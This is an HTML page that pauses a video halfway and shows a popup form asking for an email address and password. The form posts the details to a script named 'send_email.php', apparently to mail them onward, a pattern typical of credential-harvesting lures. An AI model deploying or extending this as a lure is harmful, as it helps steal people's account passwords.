<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Video Signup System</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            background: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        video {
            width: 100%;
            max-width: 800px;
        }
        .popup {
            display: none;
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background: white;
            padding: 20px;
            box-shadow: 0px 0px 10px rgba(0, 0, 0, 0.5);
            text-align: center;
            border-radius: 5px;
        }
    </style>
</head>
<body>
    <video id="video" controls>
        <source src="video1.mp4" type="video/mp4">
    </video>
    
    <div class="popup" id="signupPopup">
        <p>You need to sign up to continue watching.</p>
        <button onclick="showSignupForm()">Sign Up</button>
    </div>
    
    <div class="popup" id="formPopup">
        <form action="send_email.php" method="POST">
            <p>Enter your details:</p>
            <input type="email" name="email" placeholder="Email" required><br>
            <input type="password" name="password" placeholder="Password" required><br>
            <button type="submit">Submit</button>
        </form>
    </div>
    
    <script>
        let video = document.getElementById("video");
        let signupPopup = document.getElementById("signupPopup");
        let formPopup = document.getElementById("formPopup");
        
        video.addEventListener("timeupdate", function() {
            if (video.currentTime >= video.duration / 2) {
                video.pause();
                signupPopup.style.display = "block";
            }
        });
        
        function showSignupForm() {
            signupPopup.style.display = "none";
            formPopup.style.display = "block";
        }
    </script>
</body>
</html>
